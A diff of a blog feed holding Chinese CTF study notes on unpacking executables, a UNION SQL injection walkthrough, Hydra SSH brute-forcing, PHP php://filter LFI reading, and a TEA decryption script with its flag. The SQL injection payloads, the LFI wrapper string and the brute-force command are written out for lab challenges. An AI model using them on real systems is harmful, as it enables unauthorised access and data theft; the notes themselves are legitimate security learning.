@@ -11,10 +11,16 @@
     <content type="html"><![CDATA[<h3 id="MSG脱壳过程中的IAT修复"><a href="#MSG脱壳过程中的IAT修复" class="headerlink" title="MSG脱壳过程中的IAT修复"></a>MSG脱壳过程中的IAT修复</h3><p>进行手动查找和IAT修复<br>找可以在动态连接库中查得到的call<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122016001.png"><br>在命令行中敲425210然后查连接库函数<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122016599.png"><br>向上向下查找为0的数值(分割处)<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122016253.png"><br><img src="https://gitee.com/fogpost/photo/raw/master/202409122016865.png"><br>手动修改RVA和size的值<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122016959.png"></p>]]></content>
     
     
+    <categories>
+      
+      <category>reverse</category>
+      
+    </categories>
+    
     
     <tags>
       
-      <tag>re</tag>
+      <tag>--FSG --脱壳</tag>
       
     </tags>
     
@@ -30,10 +36,16 @@
     <content type="html"><![CDATA[<p>asp脱壳时利用</p><h4 id="模拟跟踪法"><a href="#模拟跟踪法" class="headerlink" title="模拟跟踪法"></a>模拟跟踪法</h4><p>利用tc命令跟踪<br><img src="https://gitee.com/fogpost/photo/raw/master/image12.png"><br>查找带有sfx和输入表的字段<br><img src="https://gitee.com/fogpost/photo/raw/master/image-1.png"><br>这个方法由于时程序自动进行的所以十分缓慢不建议用  </p><h4 id="SFX法"><a href="#SFX法" class="headerlink" title="SFX法"></a>SFX法</h4><p><img src="https://gitee.com/fogpost/photo/raw/master/image-3.png"><br>自动抵达<br><img src="https://gitee.com/fogpost/photo/raw/master/image-4.png"></p><h3 id="nspack"><a href="#nspack" class="headerlink" title="nspack"></a>nspack</h3><p>巧妙脱壳法<br><img src="https://gitee.com/fogpost/photo/raw/master/image-5.png"><br>at GetVersion  </p><p>下版本断点<br><img src="https://gitee.com/fogpost/photo/raw/master/image-6.png"><br>在retn处下断点<br>单步F8之后到打OEP之后向前找OEP<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122015500.png"></p>]]></content>
     
     
+    <categories>
+      
+      <category>reverse</category>
+      
+    </categories>
+    
     
     <tags>
       
-      <tag>re</tag>
+      <tag>--asp --脱壳</tag>
       
     </tags>
     
@@ -49,10 +61,16 @@
     <content type="html"><![CDATA[<h3 id="PEcompact脱壳"><a href="#PEcompact脱壳" class="headerlink" title="PEcompact脱壳"></a>PEcompact脱壳</h3><p><img src="https://gitee.com/fogpost/photo/raw/master/202409122017434.png"></p><blockquote><p>3<br>BP VirtualFree<br>F9到达取消断点<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122017793.png"><br>返回到用户代码alt+f9<br>查找PUSH 8000<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122017787.png"><br>然后单步到达<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122017628.png"></p></blockquote><blockquote><p>4<br>BP VirtualFree<br>两次shift+f9到达<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122017209.png"><br>返回到用户代码alt+f9<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122017851.png"><br>然后单步跟踪到达oep</p></blockquote><p><img src="https://gitee.com/fogpost/photo/raw/master/202409122017705.png"></p><blockquote><p>5<br>bp 0045DE74<br>运行,到达后取消断点<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122018701.png"><br>在retn处会返回并执行程序我们现在下面下个断点，然后单步到OEP<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122018935.png"><br>这一段汇编比较重要注意在retn后面加上断点</p></blockquote><p><img src="https://gitee.com/fogpost/photo/raw/master/202409122018816.png"></p><blockquote><p>6<br>bp VirtualAlloc<br>shift+f9,取消断点,返回用户代码alt+f9<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122018918.png"><br>查找jump<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122018029.png"><br>单步到OEP</p></blockquote><p><img src="https://gitee.com/fogpost/photo/raw/master/202409122018091.png"></p><blockquote><p>7  取消异常<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122018128.png"><br><img src="https://gitee.com/fogpost/photo/raw/master/202409122018041.png"><br>利用shift+f9,两次过后发现跑飞，利用第二次的SE句柄地址，（如果发现单词就跑飞了那是应为吾爱破解od中的插件strongod的过在option中将skip some Exception取消就行）<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122019809.png"><br>查找句柄<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122018041.png"><br><img src="https://gitee.com/fogpost/photo/raw/master/202409122019805.png"></p></blockquote><p><img src="https://gitee.com/fogpost/photo/raw/master/202409122019946.png"></p><blockquote><p>8  两次内存<br>注意对比跳跃代码<br>9  at Getversion<br>到达OEP的下方</p></blockquote>]]></content>
     
     
+    <categories>
+      
+      <category>reverse</category>
+      
+    </categories>
+    
     
     <tags>
       
-      <tag>re</tag>
+      <tag>--脱壳 --PEcompact</tag>
       
     </tags>
     
@@ -68,10 +86,16 @@
     <content type="html"><![CDATA[<h1 id="Sql注入初识"><a href="#Sql注入初识" class="headerlink" title="Sql注入初识"></a>Sql注入初识</h1><p>&nbsp;&nbsp;我们首先了解sql注入就是在sql数据库语句执行的时候跳过正确的执行来进行我们的语句达到权限跳过直接进行命令的执行<br><img src="https://gitee.com/fogpost/photo/raw/master/429e120f5162b5a822cd10cba585135c.png"><br>以nssctf题为例<br>首先在了解了可以利用万能密码1’进行回显之后我们利用sql语句进行库的查看</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3 --+ </span><br><span class="hljs-string">?wllm=1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>确定几列之后便可以用语句查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 --+</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/fogpost/photo/raw/master/20240912200500.png"><br>便可以了解第二列和第三列的类型<br>然后输入一下语句，查询数据库名称，以及库中有什么表，<br>并查询两张表中的字段，发现flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,database() --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?wllm=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;test_db&#x27;</span><span class="hljs-comment">--+</span><br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>test_db<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?wllm=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/fogpost/photo/raw/master/20240912200638.png"><br><img src="https://gitee.com/fogpost/photo/raw/master/20240912200811.png"><br>最后从表中查询flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,flag from test_tb --+</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/fogpost/photo/raw/master/20240912200912.png"></p>]]></content>
     
     
+    <categories>
+      
+      <category>web</category>
+      
+    </categories>
+    
     
     <tags>
       
-      <tag>web</tag>
+      <tag>Sql</tag>
       
     </tags>
     
@@ -87,10 +111,16 @@
     <content type="html"><![CDATA[<h1 id="工具使用说明书"><a href="#工具使用说明书" class="headerlink" title="工具使用说明书"></a>工具使用说明书</h1><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><p>hydra -l root -p root 127.0.0.1 -s 2111 ssh -f<br>-l： LOGIN      指定破解的用户，对特定用户破解。<br>-L：FILE     指定用户名字典。<br>-p：PASS ，指定密码破解，少用，一般是采用密码字典。<br>-P： FILE   指定密码字典文件<br>-s： PORT 指定爆破端口<br>-M：FILE    指定目标列表文件<br>-C： FILE   使用冒号分割格式，例如“登录名 : 密码”来代替-L&#x2F;-P参数。<br>-f：  在使用-M参数以后，找到第一对登录名或者密码的时候中止破解</p><blockquote><p>ps:我们可以利用hydra -h来查看帮助</p></blockquote>]]></content>
     
     
+    <categories>
+      
+      <category>tool</category>
+      
+    </categories>
+    
     
     <tags>
       
-      <tag>tool</tag>
+      <tag>--Hydra</tag>
       
     </tags>
     
@@ -106,10 +136,41 @@
     <content type="html"><![CDATA[<h3 id="脚本命令和普通命令的区别"><a href="#脚本命令和普通命令的区别" class="headerlink" title="脚本命令和普通命令的区别"></a>脚本命令和普通命令的区别</h3><blockquote><p>在我们将windows系统调成可以执行脚本命令之后我们的许多命令在cmd或ise中可能无法执行这可能是因为命名的原因   </p></blockquote><p>开启脚本执行之前</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">C:\Users\agesh&gt; where calc<br>C:\Windows\System32\calc.exe<br></code></pre></td></tr></table></figure><p>开启之后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS C:\data\code&gt; where calc<br>PS C:\data\code&gt;<br></code></pre></td></tr></table></figure><p>解决办法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS C:\Users\Bill&gt; where.exe calc<br>C:\Windows\System32\calc.exe<br></code></pre></td></tr></table></figure><h4 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS C:\Users\Bill&gt; where  [cc lang=&quot;powershell&quot;]<br>cmdlet Where-Object at command pipeline position 1<br>Supply values for the following parameters:<br>Property:<br></code></pre></td></tr></table></figure><blockquote><p>所以在写入where calc时执行的其实是where-object cacl这是没有返回值的，不是执行where.exe calc<br>但是在非脚本名模式下不会识别位where-object于是可以正常执行</p></blockquote><p><a href="https://www.codenong.com/16775686/">相关链接</a></p>]]></content>
     
     
+    <categories>
+      
+      <category>tool</category>
+      
+    </categories>
+    
     
     <tags>
       
-      <tag>tool</tag>
+      <tag>script</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>php伪协议</title>
+    <link href="/2024/09/11/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
+    <url>/2024/09/11/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
+    
+    <content type="html"><![CDATA[<p>#php伪协议<br>php伪协议<br>常见的php伪协议</p><p>1）file:&#x2F;&#x2F; 访问本地文件系统</p><p>2）http:&#x2F;&#x2F; 访问HTTP(S)网址</p><p>3）ftp:&#x2F;&#x2F; 访问FTP(S)URL</p><p>4)php:&#x2F;&#x2F; 访问各个输出输入流</p><p>5)zlib:&#x2F;&#x2F; 处理压缩流</p><p>6)data:&#x2F;&#x2F; 读取数据</p><p>7)glob:&#x2F;&#x2F; 查找匹配的文件路径模式</p><p>8)phar:&#x2F;&#x2F; PHP归档</p><p>9)rar:&#x2F;&#x2F; RAR数据压缩</p><p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php 是一种利用 PHP 流封装器 (php:&#x2F;&#x2F;filter) 的方式，常用于漏洞利用中，特别是在文件包含或文件读取的攻击场景中。让我们逐步分析其含义：</p><p>分解说明：<br>php:&#x2F;&#x2F;filter：</p><p>php:&#x2F;&#x2F; 是 PHP 的一种流封装协议，它允许直接读取或写入输入、输出、错误流以及其他特殊资源。<br>filter 是一种流过滤器，允许对流进行特定的操作，如编码、解码、压缩、加密等。<br>convert.base64-encode：</p><p>这是流过滤器的一个转换操作，它会将文件内容进行 Base64 编码。Base64 是一种将二进制数据转换为 ASCII 字符的编码方式，常用于网络传输。<br>convert.base64-encode 指定要对目标文件内容进行 Base64 编码。<br>resource&#x3D;flag.php：</p><p>resource 指定了你要操作的文件资源。在这个例子中，flag.php 是目标文件，通常是一个包含敏感信息或标志的文件，可能不允许直接通过浏览器访问。<br>通过流封装器，PHP 会读取 flag.php 的内容，并在流操作中将其进行 Base64 编码。<br>整体功能：<br>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php 的作用是：</p><p>读取 flag.php 文件的内容。<br>使用 Base64 编码对文件内容进行编码。<br>返回编码后的文件内容，而不是直接返回原始内容。<br>典型的利用场景：<br>这通常用于 本地文件包含（LFI）漏洞。在存在 LFI 漏洞的系统中，攻击者可以利用 PHP 的 include、require、file_get_contents 等函数读取任意文件，但有时文件包含被限制或敏感文件的内容不可见。</p><p>通过 php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php，攻击者可以绕过某些限制，读取文件并获取其 Base64 编码内容。然后，攻击者可以手动将 Base64 内容解码，查看文件的原始内容。</p><h1 id="include-once-file"><a href="#include-once-file" class="headerlink" title="include_once($file)"></a>include_once($file)</h1><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><ul><li>如果文件成功包含，include_once 将会返回 1</li><li>如果文件没有被找到或者在尝试包含文件过程中有错误，include_once 不会返回任何值，但会产生一个警告（除非 error_reporting 被设置成忽略警告）。</li></ul><h3 id="各类文件类型的输出情况"><a href="#各类文件类型的输出情况" class="headerlink" title="各类文件类型的输出情况"></a>各类文件类型的输出情况</h3><p>include_once 的参数不是一个 PHP 文件，那么该文件的内容会被直接输出（或执行，如果有可执行的 PHP 代码）到输出流中。具体的行为取决于该文件的内容和类型。  </p><ol><li><strong>纯文本文件（比如 .txt）</strong>: 文件的内容会被直接输出。</li><li><strong>HTML 文件（比如 .html 或 .htm）</strong>: HTML 代码会被直接输出，浏览器会按照 HTML 来渲染。</li><li><strong>XML 文件或其他标记语言文件</strong>: 文件的内容会被直接输出。</li><li><strong>二进制文件（比如图片或者音频文件）</strong>: 这样做通常不是个好主意，因为二进制数据可能会被错误地解释为文本，导致输出乱码或产生不可预测的结果。</li><li><strong>包含 PHP 代码的非 PHP 文件</strong>: 如果文件中混合有 PHP 代码（即使文件扩展名不是 .php），那么那部分 PHP 代码仍然会被执行。</li></ol>]]></content>
+    
+    
+    <categories>
+      
+      <category>web</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>--php</tag>
       
     </tags>
     
@@ -125,10 +186,16 @@
     <content type="html"><![CDATA[<h1 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h1><p>终于自己做出一道tea了乐<br>看原题<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122053979.png"><br>&emsp;典型的tea直接套模板，但是有问题，就是py中不会限定为32位所以最后的答案会超级大，我们就要去进行一个&amp;ffffffff的操作使数值正确<br>&emsp;然后就是关于题目中的小问题，首先就是delta，标准的tea是0x9E3779B9，但是在ida中总是会出现变成-0x61c88647的问题需要注意，然后就是最后的v5怎么求,就是一个偏移相加，在exp中有了</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">v0, v1</span>):<br>    delta = <span class="hljs-number">0x9E3779B9</span><br>    v3 = delta * <span class="hljs-number">32</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        v1 = (v1 - ((v0 + v3) ^ (<span class="hljs-number">16</span> * v0 + <span class="hljs-number">1634038898</span>) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1634038904</span>))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v0 = (v0 - ((v1 + v3) ^ (<span class="hljs-number">16</span> * v1 + <span class="hljs-number">1702060386</span>) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1870148662</span>))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v3 = (v3 - delta) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> v0, v1<br><span class="hljs-comment">#已知的加密结果</span><br>v4 = <span class="hljs-number">676078132</span><br>v5 = <span class="hljs-number">957400408</span><br><span class="hljs-comment">#解密</span><br>v10, v11 = decrypt(v4, v5)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decrypted v10: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(v10)&#125;</span>, v11: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(v11)&#125;</span>&quot;</span>)<br>i=<span class="hljs-number">0x49BD</span><br>j=<span class="hljs-number">0x8e00</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i)+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-built_in">hex</span>(j)+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-built_in">hex</span>(i|(j&lt;&lt;<span class="hljs-number">16</span>)))<br><span class="hljs-comment">#moectf&#123;836153a5-8e00-49bd-9c42-caf30620caaf&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
     
     
+    <categories>
+      
+      <category>reverse</category>
+      
+    </categories>
+    
     
     <tags>
       
-      <tag>re</tag>
+      <tag>rea</tag>
       
     </tags>
     
